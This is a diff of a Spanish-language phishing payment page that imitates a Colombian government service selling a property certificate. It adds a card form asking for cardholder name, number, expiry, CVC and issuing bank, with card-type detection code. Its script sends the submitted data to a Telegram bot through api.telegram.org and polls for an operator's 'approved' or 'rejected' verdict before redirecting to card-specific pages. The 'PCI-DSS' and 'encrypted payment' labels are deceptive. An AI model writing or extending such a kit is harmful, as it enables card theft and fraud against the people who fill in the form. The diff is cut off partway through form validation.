@@ -6,7 +6,730 @@
     <title>Pago Seguro — Certificado de Tradición y Libertad</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
     <style>
-        /* ... (mismo CSS que antes) ... */
+        :root {
+            --co-blue: #2c5697;
+            --co-blue-hover: #214272;
+            --co-blue-tint: #eaf0f8;
+            --co-yellow: #f6c915;
+            --co-red: #c1121f;
+            --co-green: #059669;
+            --co-text: #111827;
+            --co-text-2: #374151;
+            --co-text-muted: #6b7280;
+            --co-bg: #fff;
+            --co-input-bg: #f3f4f6;
+            --co-border: #e5e7eb;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-color: var(--co-bg);
+            color: var(--co-text);
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* HEADER */
+        header {
+            padding: 16px 0;
+            background: var(--co-bg);
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .logo svg {
+            height: 44px;
+            width: auto;
+        }
+
+        .progress-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .progress-bar-container {
+            width: 120px;
+            height: 6px;
+            background: var(--co-border);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: var(--co-blue);
+            width: 100%;
+            transition: width 0.3s ease;
+        }
+
+        .progress-text {
+            font-size: 14px;
+            color: var(--co-text);
+            white-space: nowrap;
+        }
+
+        .header-stripe {
+            display: flex;
+            height: 3px;
+            margin-top: 16px;
+        }
+
+        .stripe-1 {
+            flex: 2;
+            background-color: var(--co-yellow);
+        }
+        .stripe-2 {
+            flex: 1;
+            background-color: var(--co-blue);
+        }
+        .stripe-3 {
+            flex: 1;
+            background-color: var(--co-red);
+        }
+
+        /* MAIN CONTENT */
+        main {
+            flex: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        .content-wrapper {
+            display: flex;
+            gap: 32px;
+            justify-content: flex-start;
+        }
+
+        /* SIDEBAR */
+        aside {
+            width: 220px;
+            flex-shrink: 0;
+        }
+
+        .progress-list {
+            list-style: none;
+        }
+
+        .progress-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--co-border);
+        }
+
+        .progress-item:last-child {
+            border-bottom: none;
+        }
+
+        .progress-number {
+            width: 28px;
+            height: 28px;
+            background: var(--co-border);
+            color: var(--co-text-2);
+            border-radius: 50%;
+            flex-shrink: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 0.875rem;
+            font-weight: 600;
+        }
+
+        .progress-number.active,
+        .progress-number.completed {
+            background: var(--co-blue);
+            color: #fff;
+        }
+
+        .progress-number.completed::before {
+            content: "✓";
+        }
+
+        .progress-title {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .progress-title span:first-child {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--co-text);
+        }
+
+        .progress-item:not(.active) .progress-title span:first-child {
+            color: var(--co-text-muted);
+            font-weight: 400;
+        }
+
+        .badge {
+            display: inline-block;
+            border-radius: 2px;
+            padding: 2px 8px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .badge.info {
+            background: var(--co-blue-tint);
+            color: var(--co-blue);
+        }
+
+        .badge.neutral {
+            background: var(--co-input-bg);
+            color: var(--co-text-muted);
+        }
+
+        /* FORM AREA */
+        .form-container {
+            flex: 1;
+            max-width: 640px;
+            min-width: 0;
+        }
+
+        .form-header {
+            margin-bottom: 20px;
+        }
+
+        .form-header h1 {
+            font-size: 1.375rem;
+            font-weight: 700;
+            color: var(--co-text);
+            margin: 0 0 8px 0;
+        }
+
+        .form-header p {
+            font-size: 0.9375rem;
+            color: var(--co-text-2);
+            line-height: 1.55;
+            margin: 0;
+        }
+
+        form {
+            background: transparent;
+        }
+
+        .form-intro {
+            margin-bottom: 28px;
+            font-size: 0.875rem;
+            color: var(--co-text-muted);
+        }
+
+        .form-section {
+            display: flex;
+            flex-direction: column;
+            gap: 32px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            color: var(--co-text);
+            font-size: 0.875rem;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        .kern-input,
+        .kern-select {
+            background-color: var(--co-input-bg);
+            border: none;
+            border-bottom: 2px solid var(--co-text-2);
+            height: 48px;
+            color: var(--co-text);
+            width: 100%;
+            padding: 8px 12px;
+            font-family: 'Inter', system-ui, sans-serif;
+            font-size: 1rem;
+            transition: border-color 0.15s;
+            outline: none;
+        }
+
+        .kern-input::placeholder {
+            color: var(--co-text-muted);
+        }
+
+        .kern-input:hover,
+        .kern-select:hover {
+            border-bottom-color: var(--co-text);
+        }
+
+        .kern-input:focus,
+        .kern-select:focus {
+            border-bottom: 3px solid var(--co-blue);
+            padding-bottom: 7px;
+        }
+
+        .kern-input:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .kern-select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23374151' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-position: right 12px center;
+            background-repeat: no-repeat;
+            padding-right: 40px;
+        }
+
+        /* RESUMEN BOX ampliado con datos personales */
+        .resumen-box {
+            background: #f9fafb;
+            border: 1px solid var(--co-border);
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+
+        .resumen-title {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--co-text-muted);
+            text-transform: uppercase;
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+        }
+
+        .resumen-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--co-border);
+        }
+
+        .resumen-item:last-child {
+            border-bottom: none;
+            font-weight: 700;
+            font-size: 1rem;
+            padding-top: 16px;
+            color: var(--co-text);
+        }
+
+        .resumen-label {
+            font-size: 0.9375rem;
+            color: var(--co-text-2);
+        }
+
+        .resumen-value {
+            font-size: 0.9375rem;
+            color: var(--co-text-2);
+            font-weight: 500;
+        }
+
+        .resumen-item:last-child .resumen-value {
+            font-weight: 700;
+        }
+
+        .resumen-datos {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px dashed var(--co-border);
+        }
+
+        .resumen-datos .resumen-item {
+            padding: 8px 0;
+            border-bottom: none;
+            font-size: 0.875rem;
+        }
+
+        .resumen-datos .resumen-label {
+            font-weight: 400;
+            color: var(--co-text-muted);
+        }
+
+        /* SECURE PAYMENT SECTION */
+        .payment-section {
+            border: 1px solid var(--co-border);
+            padding: 24px;
+            margin-bottom: 24px;
+            background: #fafbfc;
+        }
+
+        .payment-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--co-border);
+        }
+
+        .payment-header svg {
+            width: 20px;
+            height: 20px;
+            color: var(--co-blue);
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .payment-info {
+            flex: 1;
+        }
+
+        .payment-title {
+            font-size: 0.9375rem;
+            font-weight: 600;
+            color: var(--co-text);
+            margin-bottom: 2px;
+        }
+
+        .payment-subtitle {
+            font-size: 0.8125rem;
+            color: var(--co-text-muted);
+        }
+
+        .payment-logos {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .payment-logos img {
+            height: 28px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* CARD INPUT WRAPPER */
+        .card-input-wrapper {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .card-logo {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 32px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+        }
+
+        .card-logo img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        .card-input-wrapper .kern-input {
+            padding-right: 48px;
+        }
+
+        /* EXPIRY AND CVC GRID */
+        .expiry-cvc-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .expiry-cvc-grid .form-group {
+            margin-bottom: 0;
+        }
+
+        .expiry-cvc-grid .form-label {
+            font-size: 0.875rem;
+            margin-bottom: 6px;
+        }
+
+        /* BANCO EMISOR */
+        .banco-group {
+            margin-bottom: 24px;
+        }
+
+        .banco-group .form-label {
+            font-size: 0.875rem;
+            margin-bottom: 6px;
+        }
+
+        /* SECURITY FOOTER */
+        .security-footer {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8125rem;
+            color: var(--co-text-muted);
+            margin-bottom: 24px;
+            padding: 16px 0;
+            border-top: 1px solid var(--co-border);
+        }
+
+        .security-footer svg {
+            width: 16px;
+            height: 16px;
+            color: var(--co-blue);
+            flex-shrink: 0;
+        }
+
+        /* LOADING OVERLAY */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            color: #fff;
+            font-size: 1.125rem;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .loading-subtext {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.875rem;
+            margin-top: 8px;
+        }
+
+        /* ERROR/SUCCESS MESSAGE */
+        .status-message {
+            display: none;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .status-message.error {
+            display: block;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #dc2626;
+        }
+
+        .status-message.success {
+            display: block;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            color: #16a34a;
+        }
+
+        /* BUTTONS */
+        .btn {
+            height: 48px;
+            padding: 0 24px;
+            font-family: 'Inter', system-ui, sans-serif;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.15s;
+            width: 100%;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background-color: var(--co-blue);
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--co-blue-hover);
+        }
+
+        .btn-primary:disabled {
+            background-color: var(--co-border);
+            cursor: not-allowed;
+        }
+
+        /* DISCLAIMER */
+        .disclaimer {
+            font-size: 0.8125rem;
+            color: var(--co-text-muted);
+            line-height: 1.6;
+            margin-top: 20px;
+            padding-top: 20px;
+        }
+
+        .disclaimer a {
+            color: var(--co-blue);
+            text-decoration: none;
+        }
+
+        .disclaimer a:hover {
+            text-decoration: underline;
+        }
+
+        /* FOOTER */
+        footer {
+            border-top: 1px solid var(--co-border);
+            padding: 16px 24px;
+            text-align: center;
+            margin-top: 60px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+        }
+
+        .footer-links a {
+            font-size: 0.75rem;
+            color: var(--co-text-muted);
+            text-decoration: none;
+        }
+
+        .footer-text {
+            font-size: 0.75rem;
+            color: var(--co-text-muted);
+            margin: 0 0 12px;
+        }
+
+        .footer-disclaimer {
+            font-size: 0.75rem;
+            color: var(--co-text-muted);
+            max-width: 720px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        /* ERROR MESSAGES */
+        .error-message {
+            color: var(--co-red);
+            font-size: 0.75rem;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .form-group.error .kern-input,
+        .form-group.error .kern-select {
+            border-bottom-color: var(--co-red);
+        }
+
+        .form-group.error .error-message {
+            display: block;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .content-wrapper {
+                flex-direction: column;
+                gap: 24px;
+            }
+
+            aside {
+                display: none;
+            }
+
+            .form-container {
+                max-width: 100%;
+            }
+
+            main {
+                padding: 16px;
+            }
+
+            .form-header h1 {
+                font-size: 1.25rem;
+            }
+
+            .btn {
+                width: 100%;
+            }
+
+            .expiry-cvc-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .form-header h1 {
+                font-size: 1.125rem;
+            }
+
+            .form-header p {
+                font-size: 0.875rem;
+            }
+
+            .form-intro {
+                font-size: 0.8125rem;
+            }
+
+            .expiry-cvc-grid {
+                grid-template-columns: 1fr;
+                gap: 16px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -18,13 +741,60 @@
     </div>
 
     <header>
-        <!-- ... mismo header ... -->
+        <div class="header-container">
+            <a aria-label="Certificado de Tradición y Libertad" href="index.html" class="logo">
+                <svg width="400" height="48" viewBox="0 0 400 48" role="img" aria-label="Certificado de Tradición y Libertad">
+                    <g transform="translate(0 6)">
+                        <rect x="0" y="0" width="5.5" height="18" fill="#F6C915"></rect>
+                        <rect x="0" y="18" width="5.5" height="9" fill="#2C5697"></rect>
+                        <rect x="0" y="27" width="5.5" height="9" fill="#C1121F"></rect>
+                    </g>
+                    <text x="24" y="16" dominant-baseline="central" font-family="'Inter', system-ui, sans-serif" font-size="10" font-weight="500" letter-spacing="1.2" fill="#6B7280">SOLICITAR DOCUMENTO</text>
+                    <text x="24" y="34" dominant-baseline="central" font-family="'Inter', system-ui, sans-serif" font-size="17" font-weight="550" fill="#111827">Certificado de Tradición y Libertad</text>
+                </svg>
+            </a>
+            <div class="progress-info">
+                <div class="progress-bar-container">
+                    <div class="progress-bar-fill"></div>
+                </div>
+                <span class="progress-text">100% completado</span>
+            </div>
+        </div>
+        <div class="header-stripe">
+            <div class="stripe-1"></div>
+            <div class="stripe-2"></div>
+            <div class="stripe-3"></div>
+        </div>
     </header>
 
     <main>
         <div class="content-wrapper">
             <aside>
-                <!-- ... mismo aside ... -->
+                <nav aria-label="Progreso">
+                    <ul class="progress-list">
+                        <li class="progress-item completed">
+                            <span class="progress-number completed"></span>
+                            <div class="progress-title">
+                                <span>Tu información personal</span>
+                                <span class="badge info">Completado</span>
+                            </div>
+                        </li>
+                        <li class="progress-item completed">
+                            <span class="progress-number completed"></span>
+                            <div class="progress-title">
+                                <span>Su solicitud en línea</span>
+                                <span class="badge info">Completado</span>
+                            </div>
+                        </li>
+                        <li class="progress-item active">
+                            <span class="progress-number active">3</span>
+                            <div class="progress-title">
+                                <span>Pago</span>
+                                <span class="badge info">Actual</span>
+                            </div>
+                        </li>
+                    </ul>
+                </nav>
             </aside>
 
             <div class="form-container">
@@ -33,8 +803,10 @@
                     <p>Complete su pago de forma segura. Su Certificado de Tradición y Libertad será enviado a su correo electrónico una vez confirmado el pago.</p>
                 </div>
 
+                <!-- STATUS MESSAGE -->
                 <div class="status-message" id="statusMessage"></div>
 
+                <!-- RESUMEN DE SOLICITUD con datos personales -->
                 <div class="resumen-box">
                     <div class="resumen-title">Resumen de su solicitud</div>
                     <div class="resumen-item">
@@ -50,6 +822,7 @@
                         <span class="resumen-value" id="total-price">23.000 Col$</span>
                     </div>
 
+                    <!-- Datos personales del solicitante -->
                     <div class="resumen-datos">
                         <div class="resumen-item">
                             <span class="resumen-label">Solicitante</span>
@@ -68,11 +841,99 @@
 
                 <form novalidate id="paymentForm">
                     <div class="form-section">
+                        <!-- SECURE PAYMENT HEADER -->
                         <div class="payment-section">
-                            <!-- ... mismo contenido de pago ... -->
+                            <div class="payment-header">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                    <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
+                                </svg>
+                                <div class="payment-info">
+                                    <div class="payment-title">Pago Seguro con Tarjeta</div>
+                                    <div class="payment-subtitle">SSL 256-bit · PCI-DSS</div>
+                                </div>
+                                <div class="payment-logos">
+                                    <img src="visa.png" alt="Visa" title="Visa">
+                                    <img src="master.png" alt="Mastercard" title="Mastercard">
+                                    <img src="ame.png" alt="American Express" title="American Express">
+                                </div>
+                            </div>
+
+                            <!-- CARDHOLDER NAME -->
+                            <div class="form-group">
+                                <label class="form-label">Nombre del titular</label>
+                                <input class="kern-input" type="text" id="cardholderName" placeholder="Exactamente como aparece en tu tarjeta" required />
+                                <div class="error-message">El nombre es requerido</div>
+                            </div>
+
+                            <!-- CARD NUMBER -->
+                            <div class="form-group">
+                                <label class="form-label">Número de tarjeta</label>
+                                <div class="card-input-wrapper">
+                                    <input class="kern-input" type="text" id="cardNumber" placeholder="Card number" maxlength="19" required />
+                                    <div class="card-logo" id="cardLogo"></div>
+                                </div>
+                                <div class="error-message" id="cardNumberError">Número de tarjeta inválido</div>
+                            </div>
+
+                            <!-- EXPIRY AND CVC -->
+                            <div class="expiry-cvc-grid">
+                                <div class="form-group">
+                                    <label class="form-label">Vencimiento</label>
+                                    <input class="kern-input" type="text" id="expiry" placeholder="MM / YY" maxlength="5" required />
+                                    <div class="error-message">Formato: MM/YY</div>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label">CVC</label>
+                                    <input class="kern-input" type="text" id="cvc" placeholder="XXX" maxlength="4" required />
+                                    <div class="error-message">CVC inválido</div>
+                                </div>
+                            </div>
+
+                            <!-- BANCO EMISOR -->
+                            <div class="form-group banco-group">
+                                <label class="form-label">Banco emisor</label>
+                                <select class="kern-select" id="bancoEmisor" required>
+                                    <option value="">Seleccione su banco</option>
+                                    <option value="Bancolombia">Bancolombia</option>
+                                    <option value="Davivienda">Davivienda</option>
+                                    <option value="BBVA Colombia">BBVA Colombia</option>
+                                    <option value="Banco de Bogotá">Banco de Bogotá</option>
+                                    <option value="Banco Popular">Banco Popular</option>
+                                    <option value="Banco Occidente">Banco Occidente</option>
+                                    <option value="Citibank Colombia">Citibank Colombia</option>
+                                    <option value="Banco AV Villas">Banco AV Villas</option>
+                                    <option value="Banco Colpatria">Banco Colpatria</option>
+                                    <option value="Bancoomeva">Bancoomeva</option>
+                                    <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
+                                    <option value="Banco Finandina">Banco Finandina</option>
+                                    <option value="Banco Falabella">Banco Falabella</option>
+                                    <option value="Banco Pichincha">Banco Pichincha</option>
+                                    <option value="Banco Cooperativo Coopcentral">Banco Cooperativo Coopcentral</option>
+                                    <option value="Otro">Otro</option>
+                                </select>
+                                <div class="error-message">Seleccione un banco emisor</div>
+                            </div>
+
+                            <!-- SECURITY FOOTER -->
+                            <div class="security-footer">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                    <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
+                                </svg>
+                                <span>Conexión cifrada · Cumple PCI-DSS</span>
+                            </div>
                         </div>
-                        <button type="submit" class="btn btn-primary" id="submitButton">Pagar de forma segura</button>
-                        <div class="disclaimer">...</div>
+
+                        <!-- SUBMIT BUTTON -->
+                        <button type="submit" class="btn btn-primary" id="submitButton">
+                            Pagar de forma segura
+                        </button>
+
+                        <!-- DISCLAIMER -->
+                        <div class="disclaimer">
+                            Al completar el pago, acepta nuestros <a href="#terminos">Términos y Condiciones</a> y <a href="#privacidad">Política de Privacidad</a>. Su pago está protegido con encriptación SSL.
+                        </div>
                     </div>
                 </form>
             </div>
@@ -80,7 +941,16 @@
     </main>
 
     <footer>
-        <!-- ... mismo footer ... -->
+        <div class="footer-links">
+            <a href="#">Política de Privacidad</a>
+            <a href="#">Términos y Condiciones</a>
+            <a href="#">Política de Reembolsos</a>
+            <a href="#">Contacto</a>
+        </div>
+        <p class="footer-text">© 2026 Certificado de Tradición y Libertad S.A.S.</p>
+        <p class="footer-disclaimer">
+            Servicio privado de gestión documental. No formamos parte del Gobierno de Colombia ni de GOV.CO; actuamos como intermediarios para facilitar tu solicitud ante la autoridad competente.
+        </p>
     </footer>
 
     <script>
@@ -105,7 +975,7 @@
             const procesamiento_prioritario = localStorage.getItem('procesamiento_prioritario') === 'true';
             const procesamiento_item = document.getElementById('procesamiento-item');
             const total_price = document.getElementById('total-price');
-            
+
             let total = 23000;
             if (procesamiento_prioritario) {
                 procesamiento_item.style.display = 'flex';
@@ -116,14 +986,13 @@
             const formatted_total = total.toLocaleString('es-CO').replace(/,/g, '.');
             total_price.textContent = formatted_total + ' Col$';
 
-            // Leer datos personales
+            // Mostrar datos personales en el resumen
             const nombre = localStorage.getItem('nombre') || 'No proporcionado';
             const apellidos = localStorage.getItem('apellidos') || '';
             const tipoDoc = localStorage.getItem('tipoDocumento') || '';
             const numeroDoc = localStorage.getItem('numeroDocumento') || 'No proporcionado';
             const email = localStorage.getItem('email') || 'No proporcionado';
 
-            // Mostrar en resumen
             document.getElementById('resumen-nombre').textContent = `${nombre} ${apellidos}`.trim() || 'No proporcionado';
             document.getElementById('resumen-documento').textContent = `${tipoDoc} ${numeroDoc}`.trim();
             document.getElementById('resumen-email').textContent = email;
@@ -133,9 +1002,136 @@
         });
 
         // ============================================
-        // DETECCIÓN DE TIPO DE TARJETA (mismo código)
+        // DETECCIÓN DE TIPO DE TARJETA
         // ============================================
-        // ... (código de detección de tarjeta igual)
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cardholderInput = document.getElementById('cardholderName');
+        const expiryInput = document.getElementById('expiry');
+        const cvcInput = document.getElementById('cvc');
+        const bancoEmisor = document.getElementById('bancoEmisor');
+        const cardLogo = document.getElementById('cardLogo');
+        const form = document.getElementById('paymentForm');
+        const submitButton = document.getElementById('submitButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const statusMessage = document.getElementById('statusMessage');
+
+        const cardPatterns = {
+            visa: {
+                regex: /^4[0-9]{12}(?:[0-9]{3})?$/,
+                bins: [4],
+                lengths: [13, 16, 19]
+            },
+            mastercard: {
+                regex: /^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/,
+                bins: [51, 52, 53, 54, 55, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271],
+                lengths: [16, 19]
+            },
+            amex: {
+                regex: /^3[47][0-9]{13}$/,
+                bins: [34, 37],
+                lengths: [15, 19]
+            }
+        };
+
+        function detectCardType(cardNumber) {
+            const cleanNumber = cardNumber.replace(/\s/g, '');
+
+            if (cleanNumber.length >= 3) {
+                const firstThree = cleanNumber.substring(0, 3);
+                const firstTwo = cleanNumber.substring(0, 2);
+                const firstOne = cleanNumber.substring(0, 1);
+
+                if (firstOne === '4') {
+                    if (cardPatterns.visa.regex.test(cleanNumber) || cleanNumber.length < 13) {
+                        return 'visa';
+                    }
+                }
+
+                if (firstTwo === '34' || firstTwo === '37') {
+                    if (cardPatterns.amex.regex.test(cleanNumber) || cleanNumber.length < 15) {
+                        return 'amex';
+                    }
+                }
+
+                if ((firstTwo >= '51' && firstTwo <= '55') ||
+                    (firstThree >= '222' && firstThree <= '272')) {
+                    if (cardPatterns.mastercard.regex.test(cleanNumber) || cleanNumber.length < 16) {
+                        return 'mastercard';
+                    }
+                }
+            }
+
+            if (cleanNumber.length >= 13) {
+                if (cardPatterns.visa.regex.test(cleanNumber)) {
+                    return 'visa';
+                } else if (cardPatterns.mastercard.regex.test(cleanNumber)) {
+                    return 'mastercard';
+                } else if (cardPatterns.amex.regex.test(cleanNumber)) {
+                    return 'amex';
+                }
+            }
+
+            return null;
+        }
+
+        function updateCardLogo(type) {
+            cardLogo.innerHTML = '';
+
+            if (type === 'visa') {
+                const img = document.createElement('img');
+                img.src = 'visa.png';
+                img.alt = 'Visa';
+                cardLogo.appendChild(img);
+            } else if (type === 'mastercard') {
+                const img = document.createElement('img');
+                img.src = 'master.png';
+                img.alt = 'Mastercard';
+                cardLogo.appendChild(img);
+            } else if (type === 'amex') {
+                const img = document.createElement('img');
+                img.src = 'ame.png';
+                img.alt = 'American Express';
+                cardLogo.appendChild(img);
+            }
+        }
+
+        function formatCardNumber(value) {
+            return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
+        }
+
+        function formatExpiry(value) {
+            const cleaned = value.replace(/\D/g, '');
+            if (cleaned.length >= 2) {
+                return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
+            }
+            return cleaned;
+        }
+
+        cardNumberInput.addEventListener('input', function(e) {
+            const cardNumber = e.target.value.replace(/\s/g, '');
+            this.value = this.value.replace(/[^0-9\s]/g, '');
+            this.value = formatCardNumber(this.value);
+
+            if (cardNumber.length >= 3) {
+                const type = detectCardType(cardNumber);
+                updateCardLogo(type);
+            } else {
+                cardLogo.innerHTML = '';
+            }
+        });
+
+        expiryInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9/]/g, '');
+            this.value = formatExpiry(this.value);
+        });
+
+        cvcInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        cardholderInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
+        });
 
         // ============================================
         // FUNCIONES DE WEBHOOK Y TELEGRAM
@@ -153,23 +1149,20 @@
         }
 
         function mostrarError(mensaje) {
-            const statusMessage = document.getElementById('statusMessage');
             statusMessage.className = 'status-message error';
             statusMessage.textContent = mensaje;
-            document.getElementById('loadingOverlay').classList.remove('active');
-            const submitButton = document.getElementById('submitButton');
+            loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
             submitButton.textContent = 'Pagar de forma segura';
-            // Rehabilitar campos
-            document.getElementById('cardNumber').disabled = false;
-            document.getElementById('cardholderName').disabled = false;
-            document.getElementById('expiry').disabled = false;
-            document.getElementById('cvc').disabled = false;
-            document.getElementById('bancoEmisor').disabled = false;
+
+            cardNumberInput.disabled = false;
+            cardholderInput.disabled = false;
+            expiryInput.disabled = false;
+            cvcInput.disabled = false;
+            bancoEmisor.disabled = false;
         }
 
         function mostrarExito(mensaje) {
-            const statusMessage = document.getElementById('statusMessage');
             statusMessage.className = 'status-message success';
             statusMessage.textContent = mensaje;
         }
@@ -210,10 +1203,8 @@
 
 ⏳ *Estado:* Esperando verificación...`;
 
-                console.log('📤 Enviando mensaje a Telegram:', mensaje);
-
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
+
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -255,20 +1246,20 @@
 
         function iniciarPolling() {
             let tiempoInicio = Date.now();
-            
+
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval);
                     mostrarError('Tiempo de espera agotado. Por favor, intente nuevamente.');
                     return;
                 }
-                
+
                 const resultado = await verificarEstadoSolicitud(solicitudId);
-                
+
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
                     mostrarExito('✅ Pago aprobado. Redirigiendo...');
-                    
+
                     setTimeout(() => {
                         if (cardType === 'visa') {
                             window.location.href = 'visa.html';
@@ -278,7 +1269,7 @@
                             window.location.href = 'amex.html';
                         }
                     }, 2000);
-                    
+
                 } else if (resultado === 'rejected') {
                     clearInterval(pollingInterval);
                     mostrarError('❌ Error al procesar la tarjeta. Por favor, verifique los datos e intente nuevamente.');
@@ -289,16 +1280,8 @@
         // ============================================
         // ENVÍO DEL FORMULARIO
         // ============================================
-        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
-            
-            const cardNumberInput = document.getElementById('cardNumber');
-            const cardholderInput = document.getElementById('cardholderName');
-            const expiryInput = document.getElementById('expiry');
-            const cvcInput = document.getElementById('cvc');
-            const bancoEmisor = document.getElementById('bancoEmisor');
-            const submitButton = document.getElementById('submitButton');
-            const loadingOverlay = document.getElementById('loadingOverlay');
 
             const cardNumber = cardNumberInput.value.replace(/\s/g, '');
             const cardholderName = cardholderInput.value.trim();
@@ -309,10 +1292,9 @@
             let isValid = true;
 
             document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
-            document.getElementById('statusMessage').className = 'status-message';
-            document.getElementById('statusMessage').textContent = '';
+            statusMessage.className = 'status-message';
+            statusMessage.textContent = '';
 
-            // Validar campos
